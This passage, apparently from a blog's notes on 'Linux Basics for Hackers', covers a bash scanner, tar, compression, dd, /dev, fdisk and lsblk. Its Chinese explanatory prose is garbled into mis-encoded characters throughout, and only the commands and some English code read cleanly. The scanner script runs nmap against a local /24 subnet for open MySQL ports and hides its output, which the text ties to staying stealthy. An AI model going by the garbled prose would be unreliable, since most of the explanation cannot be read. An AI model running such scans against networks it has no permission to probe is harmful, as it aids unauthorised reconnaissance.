class="line">â <span class="built_in">echo</span> <span class="string">"What chapter are you on in Linux Basics for Hackers?"</span>  </span><br><span class="line"><span class="built_in">read</span> chapter </span><br><span class="line">â <span class="built_in">echo</span> <span class="string">"Welcome"</span> <span class="variable">$name</span> <span class="string">"to Chapter"</span> <span class="variable">$chapter</span> <span class="string">"of Linux Basics for Hackers!"</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»#!/bin/bash å¼€å§‹ï¼Œå‘Šè¯‰ç³»ç»Ÿè¦ä½¿ç”¨è¿™ä¸ªè„šæœ¬âŠbash è§£é‡Šå™¨ã€‚ç„¶åæ·»åŠ ä¸€ä¸ªæ³¨é‡Šæè¿°è„šæœ¬â‹åŠå…¶ åŠŸèƒ½ã€‚ä¹‹å,æˆ‘ä»¬æç¤ºç”¨æˆ·è¾“å…¥ä»–ä»¬çš„åå­—ï¼ŒâŒé—®è§£é‡Šå™¨æˆ‘ä»¬çš„åå­—ï¼Œè¯»å–è¾“å…¥å¹¶å°†å…¶è½¬æ¢æˆä¸€ä¸ªå˜é‡ nameã€‚ ç„¶åæˆ‘ä»¬æç¤ºç”¨æˆ·è¾“å…¥ä»–ä»¬ç›®å‰æ­£åœ¨è¿™æœ¬ä¹¦ä¸­çš„æ‰€åœ¨ç« èŠ‚ï¼Œâæˆ‘ä»¬å†æ¬¡è¯»å–é”®ç›˜è¾“å…¥ä¸€ä¸ªå˜é‡ï¼Œè¿™ä¸ªç« èŠ‚ å« chapterã€‚<br>åœ¨æœ€åä¸€è¡Œä¸­ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªè¾“å‡ºå­—ç¬¦ä¸²ï¼Œâæ¬¢è¿è¯»è€…ï¼ˆä»–ä»¬çš„åå­—ï¼‰åœ¨æ­¤ä¹¦çš„æ‰€åœ¨ç« èŠ‚ã€‚æˆ‘ä»¬ä½¿ç”¨ echo å‘½ä»¤ï¼Œå¹¶ç”¨åŒå¼•å·æä¾›è¦åœ¨å±å¹•ä¸Šæ˜¾ç¤ºçš„æ–‡æœ¬ã€‚ç„¶åï¼Œä¸ºäº†å¡«å†™ç”¨æˆ·è¾“å…¥çš„åç§°å’Œç« å·ï¼Œæˆ‘ä»¬å°†å˜é‡ æ·»åŠ åˆ°æ¶ˆæ¯ä¸­åº”è¯¥å‡ºç°çš„ä½ç½®ã€‚å¦‚ç¬¬ 7 ç« æ‰€è¿°ï¼Œè¦ä½¿ç”¨å˜é‡ä¸­åŒ…å«çš„å€¼ï¼Œå¿…é¡»åœ¨å˜é‡åå‰é¢åŠ ä¸Š$ç¬¦å·ã€‚<br>å°†æ­¤æ–‡ä»¶ä¿å­˜ä¸º WelcomeScript.sh æ–‡ä»¶ã€‚å…¶ä¸­.sh æ‰©å±•åæ˜¯è„šæœ¬æ–‡ä»¶çš„çº¦å®šã€‚æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬ æ²¡æœ‰åŒ…å«å‰é¢çš„æ‰©å±•åï¼Œè¿™å¹¶ä¸æ˜¯ä¸¥æ ¼è¦æ±‚çš„ï¼Œå¦‚æœæ‚¨å…³é—­æ‰©å±•åï¼Œè¯¥æ–‡ä»¶å°†é»˜è®¤ä¿å­˜ä¸º shell è„šæœ¬æ–‡ä»¶ã€‚<br>ç°åœ¨ï¼Œè®©æˆ‘ä»¬è¿è¡Œè¿™ä¸ªè„šæœ¬ã€‚ä¸è¦å¿˜è®°å…ˆç”¨ chmod ç»™å…¶æ‰§è¡Œæƒé™</p><p>nmap:</p><p>nmap  -sT  192.168.181.1  -p  3306     å¯¹åœ°å€ 192.168.181.1 æ‰§è¡Œ TCP æ‰«æï¼ŒæŸ¥çœ‹ç«¯å£ 3306 (MySQL çš„é»˜è®¤ç«¯å£)æ˜¯å¦æ‰“å¼€ï¼Œ </p><h3 id="ä¸€ä¸ªç®€å•çš„æ‰«æå™¨"><a href="#ä¸€ä¸ªç®€å•çš„æ‰«æå™¨" class="headerlink" title="ä¸€ä¸ªç®€å•çš„æ‰«æå™¨"></a>ä¸€ä¸ªç®€å•çš„æ‰«æå™¨</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âŠ #! /bin/bash </span><br><span class="line">â‹ # This<span class="built_in"> script </span>is designed <span class="keyword">to</span> <span class="builtin-name">find</span> hosts with MySQL installed </span><br><span class="line">nmap âŒ-sT 192.168.181.0/24 â-p 3306 â&gt;/dev/<span class="literal">null</span> â-oG MySQLscan </span><br><span class="line">â cat MySQLscan | grep open &gt; MySQLscan2 â‘ </span><br><span class="line"> </span><br><span class="line">cat MySQLscan2</span><br></pre></td></tr></table></figure><p>âŠæˆ‘ä»¬ä½¿ç”¨æ ‡è¯†ç¬¦#ï¼å¼€å§‹ã€‚â‹è®©æˆ‘ä»¬éµå¾ªè¿™ä¸ªæ³¨é‡Šæ¥è§£é‡Šè„šæœ¬çš„ç”¨é€”ã€‚<br>ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨âŒnmap å‘½ä»¤ TCP æ‰«æå±€åŸŸç½‘ï¼Œå¯»æ‰¾ç«¯å£ 3306âã€‚(è¯·æ³¨æ„ï¼Œæ‚¨çš„ IP åœ°å€åœ¨æ‚¨çš„ç»ˆç«¯ ä¸­å¯èƒ½ä¸åŒï¼Œè¯·ä½¿ç”¨ Linux ä¸Šçš„ ifconfig å‘½ä»¤æˆ– Windows ä¸Šçš„ ipconfig å‘½ä»¤æ¥ç¡®å®šæ‚¨çš„ IP åœ°å€ã€‚) ä¸ºäº†ä¿æŒ éšç§˜ï¼Œæˆ‘ä»¬è¿˜å‘é€é€šå¸¸ä¼šå‡ºç°åœ¨å±å¹•ä¸Šçš„æ ‡å‡† nmap è¾“å‡ºåˆ° Linux çš„ä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹âï¼Œä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹åœ¨ Linux ä¸­æ¶ˆå¤±ã€‚æˆ‘ä»¬åœ¨æœ¬åœ°æœºå™¨ä¸Šåšè¿™ä¸ªï¼Œæ‰€ä»¥è¿™å¹¶ä¸é‡è¦ï¼Œä½†å¦‚æœè¦è¿œç¨‹ä½¿ç”¨è„šæœ¬ï¼Œåˆ™éœ€è¦éšè— nmap è¾“ å‡ºã€‚ç„¶åï¼Œæˆ‘ä»¬å°†æ‰«æçš„è¾“å‡ºå‘é€åˆ°ä¸€ä¸ªåä¸º MySQLscan çš„æ–‡ä»¶âï¼Œæ ¼å¼ä¸º grep æ ¼å¼ï¼Œè¿™æ„å‘³ç€ grep å¯ä»¥ å¤„ç†çš„æ ¼å¼ã€‚ </p><p>ä¸‹ä¸€è¡Œæ˜¾ç¤ºæˆ‘ä»¬å­˜å‚¨è¾“å‡ºçš„ MySQLscan æ–‡ä»¶ï¼Œâç„¶åè¾“å‡ºåˆ° grep çš„ç®¡é“ï¼Œä»¥è¿‡æ»¤åŒ…å«å…³é”®å­— openï¼ˆç«¯ å£å¼€æ”¾ï¼‰çš„æ‰€åœ¨è¡Œã€‚ç„¶åæˆ‘ä»¬æŠŠè¿™äº›å­—ç¬¦è¡Œæ”¾åˆ°ä¸€ä¸ªå‘½åä¸º MySQLscan2 çš„æ–‡ä»¶ä¸­â‘ã€‚ </p><h4 id="æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚"><a href="#æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚" class="headerlink" title="æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚"></a>æ³¨ï¼šè¿™é‡Œåªå¯¹bashè¿›è¡Œç®€å•çš„ä»‹ç»ã€‚</h4><p>å†…ç½® Bash å‘½ä»¤<br>å‘½ä»¤    åŠŸèƒ½<br>ï¼š     è¿”å› 0 æˆ– true<br>.     æ‰§è¡Œ shell è„šæœ¬<br>b     å°†ä½œä¸šæ”¾åœ¨åå°<br>break     é€€å‡ºå½“å‰å¾ªç¯<br>cd     æ”¹å˜ç›®å½•<br>continue     æ‰§è¡Œå½“å‰å¾ªç¯<br>echo     æ˜¾ç¤ºå‘½ä»¤å‚æ•°<br>eval     è®¡ç®—ä»¥ä¸‹è¡¨è¾¾å¼<br>exec     åœ¨ä¸åˆ›å»ºæ–°è¿›ç¨‹çš„æƒ…å†µä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤<br>exit     é€€å‡º shell<br>export     ä½¿å˜é‡æˆ–å‡½æ•°å¯¹å…¶ä»–ç¨‹åºå¯ç”¨<br>fg     å°†å·¥ä½œæ”¾åœ¨å‰å°<br>getopts     è§£æ shell è„šæœ¬çš„å‚æ•°<br>jobs     åˆ—å‡ºåå°(bg)æ‰§è¡Œçš„å·¥ä½œ<br>Pwd     æ˜¾ç¤ºå½“å‰ç›®å½•<br>Read     ä»æ ‡å‡†è¾“å…¥è¯»å–ä¸€è¡Œ<br>Readonly     å°†å˜é‡å£°æ˜ä¸ºåªè¯»<br>set     åˆ—å‡ºæ‰€æœ‰å˜é‡<br>shift     å°†å‚æ•°å‘å·¦ç§»åŠ¨<br>test     è¯„ä¼°å‚æ•°<br>[     æ‰§è¡Œæ¡ä»¶æµ‹è¯•<br>times     æ‰“å°ç”¨æˆ·å’Œç³»ç»Ÿæ—¶é—´<br>trap     è¿½è¸ªä¸€ä¸ªä¿¡å·<br>type     æ˜¾ç¤ºå¦‚ä½•å°†æ¯ä¸ªå‚æ•°è§£é‡Šä¸ºä¸€ä¸ªå‘½ä»¤<br>umask     æ›´æ”¹æ–°æ–‡ä»¶çš„é»˜è®¤æƒé™<br>unset     ä»å˜é‡æˆ–å‡½æ•°ä¸­åˆ é™¤å€¼<br>wait     ç­‰å¾…åå°è¿›ç¨‹å®Œæˆ</p><h2 id="å‹ç¼©å’Œå½’æ¡£"><a href="#å‹ç¼©å’Œå½’æ¡£" class="headerlink" title="å‹ç¼©å’Œå½’æ¡£"></a>å‹ç¼©å’Œå½’æ¡£</h2><h3 id="å½’æ¡£"><a href="#å½’æ¡£" class="headerlink" title="å½’æ¡£"></a>å½’æ¡£</h3><p>tar  -cvf  HackersArise.tar  hackersarise1  hackersarise2  hackersarise3 </p><p>å½’æ¡£å‘½ä»¤æ˜¯ tarï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä½¿ç”¨å®ƒæœ‰ä¸‰ä¸ªå‚æ•°é€‰é¡¹ã€‚c é€‰é¡¹è¡¨ ç¤ºåˆ›å»ºï¼Œv(ä»£è¡¨è¯¦ç»†è¿‡ç¨‹ï¼Œæ˜¯å¯é€‰çš„)åˆ—å‡º tar æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ï¼Œf è¡¨ç¤ºå†™å…¥ä»¥ä¸‹ä¸€ä¸ªæ–‡ä»¶ã€‚æœ€åä¸€ä¸ªé€‰é¡¹ä¹Ÿ é€‚ç”¨äºä»æ–‡ä»¶ä¸­è¯»å–ã€‚ç„¶åï¼Œæˆ‘ä»¬ä¸ºæ–°å½’æ¡£æ–‡ä»¶æä¾›æ‚¨å¸Œæœ›ä»è¿™ä¸‰ä¸ªè„šæœ¬æ¥åˆ›å»ºçš„æ–‡ä»¶å:HackersArise.tarã€‚</p><p>tar  -tvf  HackersArise.tar         ä½¿ç”¨ tar å‘½ä»¤å’Œ-t å†…å®¹åˆ—è¡¨å‚æ•°ä» tar åŒ…ä¸­æ˜¾ç¤ºè¿™äº›æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦æå–å®ƒä»¬ï¼Œ</p><p>tar  -xvf  HackersArise.tar         ä½¿ç”¨ tar å‘½ä»¤å’Œ-x (extract)é€‰é¡¹ä» tar åŒ…ä¸­æå–è¿™äº›æ–‡ä»¶</p><h3 id="å‹ç¼©"><a href="#å‹ç¼©" class="headerlink" title="å‹ç¼©"></a>å‹ç¼©</h3><p>â€‹                        </p><table><thead><tr><th>å‹ç¼©æ–¹å¼</th><th>å‹ç¼©æ–‡ä»¶</th><th>è§£å‹æ–‡ä»¶</th></tr></thead><tbody><tr><td>â€¢ bzip2ï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.bz2</td><td>bzip2  HackersArise.*</td><td>bunzip2  HackersArise.*</td></tr><tr><td>â€¢ compressï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.Z</td><td>compress  HackersArise.*</td><td>uncompress  HackersArise.*</td></tr><tr><td>â€¢ gzipï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.gz æˆ–.tgz</td><td>gzip  HackersArise.*</td><td>gunzip  HackersArise.*</td></tr></tbody></table><h3 id="åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬"><a href="#åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬" class="headerlink" title="åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬"></a>åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„é€ä½æˆ–ç‰©ç†å‰¯æœ¬</h3><p>dd å‘½ä»¤çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹: </p><p>dd if=inputfile of=outputfile </p><p>dd æ˜¯æŒ‡å®šè¾“å…¥æ–‡ä»¶çš„ç‰©ç†â€œå¤åˆ¶â€å‘½ä»¤ï¼Œ</p><p>/dev/sdb è¡¨ç¤ºæŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„/dev ç›®å½•ä¸‹çš„é—ªå­˜é©±åŠ¨å™¨ï¼Œ</p><p>/root/flashcopy æ˜¯è¦å°†ç‰©ç†å‰¯æœ¬å¤åˆ¶åˆ°çš„æ–‡ä»¶çš„åç§°</p><p>dd  if=/dev/media  of=/root/flashcopy  bs=4096  conv:noerror</p><p>dd å‘½ä»¤å¯ä»¥ä½¿ç”¨è®¸å¤šå‚æ•°é€‰é¡¹ï¼Œæ‚¨å¯ä»¥å¯¹è¿™äº›é€‰é¡¹è¿›è¡Œä¸€äº›ç ”ç©¶ï¼Œä½†å…¶ä¸­æœ€æœ‰ç”¨çš„æ˜¯ noerror é€‰é¡¹å’Œ bs(å—å¤§å°)é€‰é¡¹ã€‚é¡¾åæ€ä¹‰ï¼Œå³ä½¿é‡åˆ°é”™è¯¯ï¼Œnoerror é€‰é¡¹ä¹Ÿä¼šç»§ç»­å¤åˆ¶ã€‚bs é€‰é¡¹å…è®¸æ‚¨ç¡®å®šè¦å¤åˆ¶çš„æ•° æ®çš„å—å¤§å°(æ¯ä¸ªå—çš„è¯»/å†™å­—èŠ‚æ•°)ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒè¢«è®¾ç½®ä¸º 512 å­—èŠ‚ï¼Œä½†æ˜¯å¯ä»¥æ›´æ”¹å®ƒä»¥åŠ å¿«è¿›åº¦ã€‚é€š å¸¸ï¼Œè¿™å°†è®¾ç½®ä¸ºè®¾å¤‡çš„æ‰‡åŒºå¤§å°ï¼Œé€šå¸¸ä¸º 4KB(4096 å­—èŠ‚)ã€‚</p><h2 id="æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†"><a href="#æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†"></a>æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡ç®¡ç†</h2><h3 id="è®¾å¤‡ç›®å½•-DEV"><a href="#è®¾å¤‡ç›®å½•-DEV" class="headerlink" title="è®¾å¤‡ç›®å½•/DEV"></a>è®¾å¤‡ç›®å½•/DEV</h3><p>Linux æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç›®å½•ï¼Œå…¶ä¸­åŒ…å«ä»£è¡¨æ¯ä¸ªé™„åŠ è®¾å¤‡çš„æ–‡ä»¶ï¼šé€‚å½“å‘½åçš„/dev ç›®å½•ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /dev </span><br><span class="line">kali &gt;ls  -l total<span class="number"> 0 </span></span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,175 May<span class="number"> 16 </span>12:44 agpgart </span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,235 May<span class="number"> 16 </span>12:44 autofs </span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span> root root<span class="number"> 160 </span>May<span class="number"> 16 </span>12:44 block </span><br><span class="line">Â­Â­snip-- </span><br><span class="line">lrwxrwxrwx  <span class="number"> 1 </span> root root<span class="number"> 3 </span>May<span class="number"> 16 </span>12:44 cdrom -&gt; sr0 </span><br><span class="line">Â­Â­snip-- </span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span> root root<span class="number"> 60 </span>May<span class="number"> 16 </span>12:44 cpu </span><br><span class="line">Â­Â­snip--</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¸¦æœ‰ fdisk çš„-l å‚æ•°åˆ—å‡ºæ‰€æœ‰é©±åŠ¨å™¨çš„æ‰€æœ‰åˆ†åŒºï¼Œ</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fdisk  -l </span><br><span class="line">Disk /dev/sda: 20GiB,<span class="number"> 21474836480 </span>bytes,<span class="number"> 41943040 </span>sectors  </span><br><span class="line">108 </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes </span><br><span class="line">  </span><br><span class="line">Disk label type: dos </span><br><span class="line">Disk identifier: 0x7c06cd70 </span><br><span class="line"> </span><br><span class="line">Device Boot Start End   Sectors Size Id Type </span><br><span class="line">/dev/sda1 *<span class="number"> 2048 </span>39174143<span class="number"> 39172096 </span>18.7G<span class="number"> 83 </span>Linux </span><br><span class="line">/dev/sda2<span class="number"> 39176190 </span><span class="number"> 41940991 </span> <span class="number"> 2764802 </span>1.3G<span class="number"> 5 </span>Extended </span><br><span class="line">/dev/sda5<span class="number"> 39176192 </span><span class="number"> 41940991 </span> <span class="number"> 2764800 </span>1.3G<span class="number"> 82 </span>Linux swap / Solaris </span><br><span class="line"> </span><br><span class="line">Disk /dev/sdb: 29.8 GiB,<span class="number"> 31999393792 </span>bytes,<span class="number"> 62498816 </span>sectors </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes Disk label type: dos </span><br><span class="line">Disk identifier: 0xc3072e18 </span><br><span class="line"> </span><br><span class="line">Device Boot  Start End Sectors Size Id Type </span><br><span class="line">/dev/sdb1<span class="number"> 32 </span>62498815<span class="number"> 62498784 </span>29.8G<span class="number"> 7 </span>HPFS/NTFS/exFAT</span><br></pre></td></tr></table></figure><p>è®¾å¤‡ sda1ã€sda2 å’Œ sda5 åœ¨ç¬¬ä¸€èŠ‚ä¸­åˆ—å‡ºã€‚è¿™ä¸‰ç§è®¾å¤‡æ„æˆäº†æˆ‘çš„è™šæ‹Ÿæœºçš„è™šæ‹Ÿç£ ç›˜ï¼Œå®ƒæ˜¯ä¸€ä¸ª 20GB çš„é©±åŠ¨å™¨ï¼Œæœ‰ä¸‰ä¸ªåˆ†åŒºï¼ŒåŒ…æ‹¬äº¤æ¢åˆ†åŒº(sda5)ï¼Œå½“ RAM å®¹é‡è¶…è¿‡æ—¶ï¼Œå®ƒå……å½“è™šæ‹Ÿ RAM â€”ç±»ä¼¼äº Windows ä¸­çš„è™šæ‹Ÿé¡µé¢æ–‡ä»¶ã€‚<br>å‘ä¸‹æ‰«æåˆ°ç¬¬ä¸‰èŠ‚ï¼Œæ‚¨å°†çœ‹åˆ°æŒ‡å®šä¸º sdb -çš„ç¬¬äºŒä¸ªè®¾å¤‡è¾“å‡ºï¼Œb æ ‡ç­¾å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªé©± åŠ¨å™¨ä¸å‰ä¸‰ä¸ªè®¾å¤‡æ˜¯åˆ†å¼€çš„ã€‚è¿™æ˜¯æˆ‘çš„ 64GB é—ªå­˜ã€‚æ³¨æ„ï¼Œfdisk è¡¨ç¤ºå®ƒæ˜¯ HPFS/NTFS/ExFAT æ–‡ä»¶ç³»ç»Ÿç±»å‹ã€‚ è¿™äº›æ–‡ä»¶ç±»å‹â€”â€”é«˜æ€§èƒ½æ–‡ä»¶ç³»ç»Ÿ(HPFS)ã€æ–°æŠ€æœ¯æ–‡ä»¶ç³»ç»Ÿ(NTFS)å’Œæ‰©å±•æ–‡ä»¶åˆ†é…è¡¨(exFAT)â€”â€”ä¸æ˜¯ Linux ç³»ç»Ÿçš„æœ¬æœºæ–‡ä»¶ï¼Œè€Œæ˜¯ macOS å’Œ Windows ç³»ç»Ÿçš„ã€‚åœ¨è¿›è¡Œç ”ç©¶æ—¶ï¼Œèƒ½å¤Ÿè¯†åˆ«ä¸åŒç³»ç»Ÿçš„åŸç”Ÿæ–‡ä»¶ç±»å‹æ˜¯å€¼ å¾—çš„ã€‚æ–‡ä»¶ç³»ç»Ÿå¯èƒ½æŒ‡å‡ºé©±åŠ¨å™¨çš„æ ¼å¼è®¾ç½®åœ¨å“ªç§æœºå™¨ä¸Šï¼Œè¿™æ˜¯æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚Kali èƒ½å¤Ÿä½¿ç”¨åœ¨è®¸å¤šä¸åŒæ“ ä½œç³»ç»Ÿä¸Šåˆ›å»ºçš„ USB é—ªå­˜é©±åŠ¨å™¨ã€‚<br>æ­£å¦‚æ‚¨åœ¨ç¬¬ 1 ç« ä¸­çœ‹åˆ°çš„ï¼ŒLinux æ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„ä¸ Windows å’Œå…¶ä»–ä¸“æœ‰æ“ä½œç³»ç»Ÿæœ‰å¾ˆå¤§çš„ä¸åŒã€‚æœ€é‡ è¦çš„æ˜¯ï¼ŒLinux ä¸­æ–‡ä»¶çš„å­˜å‚¨å’Œç®¡ç†æ–¹å¼ä¹Ÿä¸åŒã€‚æ–°ç‰ˆæœ¬çš„ Windows ä½¿ç”¨ NTFS æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ—§çš„ Windows<br>109<br>ç³»ç»Ÿä½¿ç”¨æ–‡ä»¶åˆ†é…è¡¨(FAT)ç³»ç»Ÿã€‚<br>Linux ä½¿ç”¨è®¸å¤šä¸åŒç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æœ€å¸¸è§çš„æ˜¯ ext2ã€ext3 å’Œ ext4ã€‚è¿™äº›éƒ½æ˜¯ ext(æˆ–æ‰©å±•çš„)æ–‡ä»¶ç³» ç»Ÿçš„å‡çº§ç‰ˆï¼Œext4 æ˜¯æœ€æ–°çš„ã€‚ </p><h3 id="å­—ç¬¦å’Œå—è®¾å¤‡"><a href="#å­—ç¬¦å’Œå—è®¾å¤‡" class="headerlink" title="å­—ç¬¦å’Œå—è®¾å¤‡"></a>å­—ç¬¦å’Œå—è®¾å¤‡</h3><p>å…³äº/dev ç›®å½•ä¸­è®¾å¤‡æ–‡ä»¶çš„å‘½åï¼Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¬¬ä¸€ä¸ªä½ç½®åŒ…å« c æˆ– bã€‚æ‚¨å¯ä»¥åœ¨æ¸…å• 10-1 çš„å¤§ å¤šæ•°æ¡ç›®å¼€å¤´çœ‹åˆ°è¿™ä¸€ç‚¹ï¼Œå®ƒçœ‹èµ·æ¥åƒè¿™æ ·: </p><p>è¿™äº›å­—æ¯ä»£è¡¨è®¾å¤‡è¾“å…¥å’Œè¾“å‡ºæ•°æ®çš„ä¸¤ç§æ–¹å¼ã€‚c ä»£è¡¨å­—ç¬¦ï¼Œå¦‚æ‚¨æ‰€æ–™ï¼Œè¿™äº›è®¾å¤‡è¢«ç§°ä¸ºå­—ç¬¦è®¾å¤‡ã€‚é€š è¿‡é€ä¸ªå­—ç¬¦(å¦‚é¼ æ ‡æˆ–é”®ç›˜)å‘é€å’Œæ¥æ”¶æ•°æ®ä¸ç³»ç»Ÿäº¤äº’çš„å¤–éƒ¨è®¾å¤‡æ˜¯å­—ç¬¦è®¾å¤‡ã€‚ </p><p>b ä»£è¡¨ç¬¬äºŒç§ç±»å‹:å—è®¾å¤‡ã€‚å®ƒä»¬ä»¥æ•°æ®å—(ä¸€æ¬¡å¤šä¸ªå­—èŠ‚)è¿›è¡Œé€šä¿¡ï¼ŒåŒ…æ‹¬ç¡¬ç›˜é©±åŠ¨å™¨å’Œ DVD é©±åŠ¨å™¨ç­‰ è®¾å¤‡ã€‚è¿™äº›è®¾å¤‡éœ€è¦æ›´é«˜çš„æ•°æ®ååé‡ï¼Œå› æ­¤ä»¥å—(ä¸€æ¬¡å¤šä¸ªå­—ç¬¦æˆ–å­—èŠ‚)çš„å½¢å¼å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚ä¸€æ—¦æ‚¨çŸ¥ é“ä¸€ä¸ªè®¾å¤‡æ˜¯å­—ç¬¦è®¾å¤‡è¿˜æ˜¯å—è®¾å¤‡ï¼Œæ‚¨å°±å¯ä»¥è½»æ¾åœ°è·å¾—å…³äºå®ƒçš„æ›´å¤šä¿¡æ¯ã€‚</p><h3 id="ä½¿ç”¨-lsblkåˆ—å‡º-å—è®¾å¤‡å’Œä¿¡æ¯"><a href="#ä½¿ç”¨-lsblkåˆ—å‡º-å—è®¾å¤‡å’Œä¿¡æ¯" class="headerlink" title="ä½¿ç”¨ lsblkåˆ—å‡º å—è®¾å¤‡å’Œä¿¡æ¯"></a>ä½¿ç”¨ lsblkåˆ—å‡º å—è®¾å¤‡å’Œä¿¡æ¯</h3><p>Linux å‘½ä»¤ lsblk (list block çš„ç¼©å†™)åˆ—å‡º/dev ä¸­åˆ—å‡ºçš„æ¯ä¸ªå—è®¾å¤‡çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚ç»“æœç±»ä¼¼äº fdisk -l çš„è¾“å‡ºï¼Œä½†å®ƒä¹Ÿå°†åœ¨ä¸€ç§æ ‘å‹ç»“æ„ä¸­æ˜¾ç¤ºå…·æœ‰å¤šä¸ªåˆ†åŒºçš„è®¾å¤‡ï¼Œå°†æ¯ä¸ªè®¾å¤‡çš„åˆ†åŒºæ˜¾ç¤ºä¸ºåˆ†æ”¯ï¼Œå¹¶ä¸”ä¸éœ€ è¦è¿è¡Œæ ¹ç‰¹æƒã€‚ä¾‹å¦‚ï¼Œåœ¨æ¸…å• 10-3 ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† sda åŠå…¶åˆ†æ”¯ sda1ã€sda2 å’Œ sda5ã€‚ </p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;lsblk </span><br><span class="line">Name MAJ:MIN RM SIZE RO TYPE MOUNTPOINT </span><br><span class="line">fd0 2:0<span class="number"> 1 </span>4K<span class="number"> 0 </span>disk </span><br><span class="line">sda1 8:0<span class="number"> 0 </span>20G<span class="number"> 0 </span>disk </span><br><span class="line">|-sda1 8:1<span class="number"> 0 </span>18.7G<span class="number"> 0 </span>part / </span><br><span class="line">|-sda2 8:2<span class="number"> 0 </span>1K<span class="number"> 0 </span>part </span><br><span class="line">|-sda5 8:5<span class="number"> 0 </span>1.3G<span class="number"> 0 </span>part [SWAP] </span><br><span class="line"></span><br><span class="line">sdb 8:16<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk </span><br><span class="line">|-sdb1 8.17<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk /media </span><br><span class="line">sr0 11:0<span class="number"> 1 </span>2.7G<span class="number"> 0 </span>rom</span><br></pre></td></tr></table></figure><p>è¾“å‡ºåŒ…æ‹¬è½¯ç›˜é©±åŠ¨å™¨ä½œä¸º fd0, DVD é©±åŠ¨å™¨ä½œä¸º 